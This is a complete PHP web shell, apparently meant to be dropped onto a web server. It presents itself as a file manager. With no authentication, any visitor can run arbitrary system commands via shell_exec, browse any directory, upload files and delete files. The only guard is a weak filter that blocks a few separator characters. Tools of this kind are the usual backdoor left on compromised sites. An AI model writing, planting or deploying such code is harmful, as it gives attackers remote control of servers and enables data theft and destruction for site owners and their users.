<?php
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
if (!is_dir($path)) {
    die("Invalid directory path.");
}
$items = scandir($path);

function executeCommand($command) {
    if (preg_match('/[;&|]/', $command)) {
        return "Invalid command.";
    }
    return "<pre>" . htmlspecialchars(shell_exec($command)) . "</pre>";
}

function createFile($path, $filename) {
    $filepath = $path . DIRECTORY_SEPARATOR . $filename;
    return file_put_contents($filepath, '') !== false ? "File created: $filename" : "Failed to create file.";
}

function createFolder($path, $foldername) {
    $folderpath = $path . DIRECTORY_SEPARATOR . $foldername;
    return mkdir($folderpath) ? "Folder created: $foldername" : "Failed to create folder.";
}

function deleteItem($path) {
    return is_dir($path) ? rmdir($path) : unlink($path);
}

function uploadFile($path, $file) {
    $target = $path . DIRECTORY_SEPARATOR . basename($file['name']);
    return move_uploaded_file($file['tmp_name'], $target) ? "Uploaded: " . $file['name'] : "Failed to upload.";
}

$output = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['command'])) {
        $output = executeCommand($_POST['command']);
    } elseif (isset($_POST['create_file'])) {
        $output = createFile($path, $_POST['filename']);
    } elseif (isset($_POST['create_folder'])) {
        $output = createFolder($path, $_POST['foldername']);
    } elseif (isset($_POST['delete'])) {
        $output = deleteItem($_POST['item_path']) ? "Deleted: {$_POST['item_path']}" : "Failed to delete.";
    } elseif (isset($_FILES['upload'])) {
        $output = uploadFile($path, $_FILES['upload']);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced File Manager & Shell</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; margin: 20px; }
        input, button { margin: 5px 0; }
        ul { list-style-type: none; padding: 0; }
        a { text-decoration: none; color: #007bff; }
        a:hover { text-decoration: underline; }
        pre { background-color: #fff; padding: 10px; border: 1px solid #ccc; }
    </style>
</head>
<body>
    <h2>📂 File Manager & Shell</h2>

    <h3>📍 Current Directory: 
        <a href="?path=<?php echo urlencode(dirname($path)); ?>">🔼 Up</a> / 
        <?php echo realpath($path); ?>
    </h3>
    
    <ul>
        <?php foreach ($items as $item): ?>
            <?php if ($item == '.' || $item == '..') continue; ?>
            <li>
                <?php $item_path = $path . DIRECTORY_SEPARATOR . $item; ?>
                <?php if (is_dir($item_path)): ?>
                    <a href="?path=<?php echo urlencode($item_path); ?>">📁 <?php echo htmlspecialchars($item); ?></a>
                <?php else: ?>
                    📄 <?php echo htmlspecialchars($item); ?> 
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="item_path" value="<?php echo $item_path; ?>">
                        <button type="submit" name="delete" onclick="return confirm('Delete this item?')">🗑️ Delete</button>
                    </form>
                <?php endif; ?>
            </li>
        <?php endforeach; ?>
    </ul>

    <h3>💻 Execute Command</h3>
    <form method="POST">
        <input type="text" name="command" placeholder="Enter shell command" required style="width: 80%;">
        <button type="submit">Run</button>
    </form>

    <h3>📁 Create Folder / File</h3>
    <form method="POST">
        <input type="text" name="foldername" placeholder="Folder name" required>
        <button type="submit" name="create_folder">Create Folder</button>
    </form>

    <form method="POST">
        <input type="text" name="filename" placeholder="File name" required>
        <button type="submit" name="create_file">Create File</button>
    </form>

    <h3>⬆️ Upload File</h3>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="upload" required>
        <button type="submit">Upload</button>
    </form>

    <?php if ($output): ?>
        <h3>📝 Output:</h3>
        <?php echo $output; ?>
    <?php endif; ?>
</body>
</html>
